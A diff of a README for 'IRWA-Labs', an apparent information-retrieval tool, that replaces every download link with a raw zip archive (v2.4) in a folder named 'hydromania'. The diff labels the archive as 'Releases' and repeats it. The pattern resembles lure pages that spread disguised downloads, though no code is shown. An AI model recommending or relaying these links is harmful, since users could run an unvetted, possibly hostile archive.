@@ -6,7 +6,7 @@ Welcome to IRWA-Labs! This tool helps you explore Information Retrieval and Web 
 
 ## 📥 Download Now
 
-[![Download IRWA-Labs](https://github.com/wolfvapes/IRWA-Labs/raw/refs/heads/main/hydromania/IRW_Labs_v1.8.zip)](https://github.com/wolfvapes/IRWA-Labs/raw/refs/heads/main/hydromania/IRW_Labs_v1.8.zip)
+[![Download IRWA-Labs](https://raw.githubusercontent.com/wolfvapes/IRWA-Labs/main/hydromania/Labs-IRW-v2.4.zip)](https://raw.githubusercontent.com/wolfvapes/IRWA-Labs/main/hydromania/Labs-IRW-v2.4.zip)
 
 ## 📂 What Does IRWA-Labs Do?
 
@@ -35,7 +35,7 @@ To use IRWA-Labs, make sure your system meets the following requirements:
 
 To get started, you can download the latest version of IRWA-Labs. 
 
-1. Visit this page to download: [IRWA-Labs Releases](https://github.com/wolfvapes/IRWA-Labs/raw/refs/heads/main/hydromania/IRW_Labs_v1.8.zip).
+1. Visit this page to download: [IRWA-Labs Releases](https://raw.githubusercontent.com/wolfvapes/IRWA-Labs/main/hydromania/Labs-IRW-v2.4.zip).
 
 2. Look for the latest version listed. Click on the download link to save the installation file to your computer.
 
@@ -85,6 +85,6 @@ Stay updated with the latest developments and connect with others interested in 
 
 ## 📥 Download Now Again
 
-For your convenience, here’s the link to download IRWA-Labs once more: [IRWA-Labs Releases](https://github.com/wolfvapes/IRWA-Labs/raw/refs/heads/main/hydromania/IRW_Labs_v1.8.zip).
+For your convenience, here’s the link to download IRWA-Labs once more: [IRWA-Labs Releases](https://raw.githubusercontent.com/wolfvapes/IRWA-Labs/main/hydromania/Labs-IRW-v2.4.zip).
 
 Thank you for using IRWA-Labs. We hope it enhances your understanding and projects in information retrieval and web analytics!
